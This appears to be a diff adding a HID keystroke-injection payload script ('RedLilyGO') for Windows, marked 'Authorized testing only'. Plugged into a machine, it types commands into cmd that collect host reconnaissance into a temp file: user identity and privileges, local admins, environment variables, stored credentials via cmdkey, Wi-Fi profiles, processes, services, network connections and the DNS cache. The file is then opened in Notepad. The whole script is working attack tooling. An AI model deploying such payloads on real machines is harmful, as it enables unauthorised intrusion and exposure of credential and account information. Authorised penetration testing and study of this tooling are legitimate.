@@ -1,0 +1,110 @@
+REM RedLilyGO - System Info (Windows HID). Collects detailed host info to %TEMP%\sysinfo.txt and opens Notepad. Authorized testing only.
+LED 200 100 100 120
+DELAY 1500
+GUI r
+DELAY 800
+STRING cmd
+ENTER
+DELAY 1500
+STRING set R=%TEMP%\sysinfo.txt
+ENTER
+DELAY 300
+STRING del "%R%" 2>nul
+ENTER
+DELAY 200
+STRING echo ==== SYSINFO %DATE% ==== > "%R%"
+ENTER
+DELAY 200
+STRING net session >nul 2>&1 && echo ADMIN||echo USER >> "%R%"
+ENTER
+DELAY 400
+STRING (echo IDENTITY&whoami /all)>>"%R%" 2>&1
+ENTER
+DELAY 1500
+STRING (echo HOST&hostname)>>"%R%"
+ENTER
+DELAY 400
+STRING (echo OS&ver)>>"%R%"
+ENTER
+DELAY 400
+STRING systeminfo >> "%R%"
+ENTER
+DELAY 4000
+STRING (echo MACHINE&wmic computersystem get name)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo DOMAIN&echo %USERDOMAIN%)>>"%R%"
+ENTER
+DELAY 400
+STRING (echo CPU&wmic cpu get name)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo BIOS&wmic bios get serialnumber)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo DISKS&wmic logicaldisk get caption,size)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo ENV&set)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo USERS&net user)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo ADMINS&net localgroup administrators)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo GROUPS&net localgroup)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo ACCOUNTS&net accounts)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo SHARES&net share)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo SESSIONS&net use)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo CONFIG&net config workstation)>>"%R%"
+ENTER
+DELAY 1000
+STRING (echo QUSER&quser)>>"%R%" 2>&1
+ENTER
+DELAY 1000
+STRING (echo PROCS&tasklist /v)>>"%R%"
+ENTER
+DELAY 2500
+STRING (echo SVC&sc query type= service state= all)>>"%R%"
+ENTER
+DELAY 3000
+STRING (echo SCHED&schtasks /query /fo TABLE)>>"%R%"
+ENTER
+DELAY 2000
+STRING (echo DRIVERS&driverquery)>>"%R%"
+ENTER
+DELAY 2000
+STRING (echo CREDS&cmdkey /list)>>"%R%"
+ENTER
+DELAY 800
+STRING (echo WIFI&netsh wlan show profiles)>>"%R%"
+ENTER
+DELAY 1500
+STRING (echo IP&ipconfig /all)>>"%R%"
+ENTER
+DELAY 1500
+STRING (echo ARP&arp -a)>>"%R%"
+ENTER
+DELAY 1500
+STRING (echo ROUTE&route print)>>"%R%"
+ENTER
+DELAY 1500
+STRING (echo NETSTAT&netstat -ano)>>"%R%"
+ENTER
+DELAY 2500
+STRING (echo DNS&ipconfig /displaydns)>>"%R%"
+ENTER
+DELAY 1500
+STRING notepad "%R%"
+ENTER
+LED_G
